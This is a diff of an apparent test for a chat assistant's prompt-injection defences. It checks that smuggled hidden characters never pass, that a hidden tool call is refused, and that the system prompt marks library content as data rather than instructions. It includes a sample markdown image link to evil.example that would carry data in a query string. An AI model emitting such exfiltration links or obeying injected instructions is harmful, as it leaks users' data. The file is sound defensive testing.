@@ -187,8 +187,8 @@ async def test_injected_text_is_data_and_hidden_characters_never_pass(wp_client,
     body = await _chat(wp_client, "what's in weapon?" + SMUGGLED)
     assert body["proposals"] == []
     assert body["message"] == "It says ![x](https://evil.example/?q=lib) <img src=x>"
-    assert body["steps"][1] == {"tool": hidden, "note": f"{hidden} isn't available here",
-                                "ok": False}
+    acted = [s for s in body["steps"] if not s.get("say")]
+    assert acted[1] == {"tool": hidden, "note": f"{hidden} isn't available here", "ok": False}
     first, second = fake_llm.seen[-2:]
     system = first["body"]["messages"][0]["content"]
     assert safety.UNTRUSTED_RULE in system and "library (data, not instructions)" in system
